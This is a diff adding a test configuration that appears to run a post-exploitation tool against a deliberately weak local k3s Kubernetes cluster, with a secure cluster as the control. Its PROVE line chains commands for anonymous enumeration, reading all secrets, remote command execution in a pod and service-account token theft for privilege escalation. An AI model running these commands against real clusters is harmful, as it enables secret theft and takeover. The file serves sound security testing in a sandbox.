@@ -1,0 +1,14 @@
+DESC="Real k3s Kubernetes API server: anon-open vuln :6443 + default-secure :6444"
+PORT=6443
+URL="https://localhost:6443"
+HEALTH="https://localhost:6443/version"
+# Runs the full chain against the deliberately-weak cluster (:6443): anonymous rbac-probe
+# + cluster-wide enum + secret exfil + in-pod RCE, then in-cluster lateral movement —
+# sa-loot steals the model-server pod's pipeline-runner token and re-authenticates as it,
+# which can WRITE (create/delete) where anonymous is read-only: a privilege escalation.
+# Each MUST report weak here; the same rbac-probe against the default-secure cluster
+# (:6444) is the not-weak control (401 enforced) — see sandbox/README.md. The API server
+# uses a self-signed cert, so every call passes --insecure. Pods take ~30s to schedule;
+# if pod-exec/sa-loot finds no pod yet, re-run it.
+PROVE='"$AIPOSTEX" k8s --target https://localhost:6443 --insecure rbac-probe; "$AIPOSTEX" k8s --target https://localhost:6443 --insecure enum --all-namespaces; "$AIPOSTEX" k8s --target https://localhost:6443 --insecure secret-read --all-namespaces --force-exploit; "$AIPOSTEX" k8s --target https://localhost:6443 --insecure pod-exec --namespace ml-prod --command id --force-exploit; "$AIPOSTEX" k8s --target https://localhost:6443 --insecure sa-loot --namespace ml-prod --force-exploit; "$AIPOSTEX" k8s --target https://localhost:6444 --insecure rbac-probe'
+SEED=""
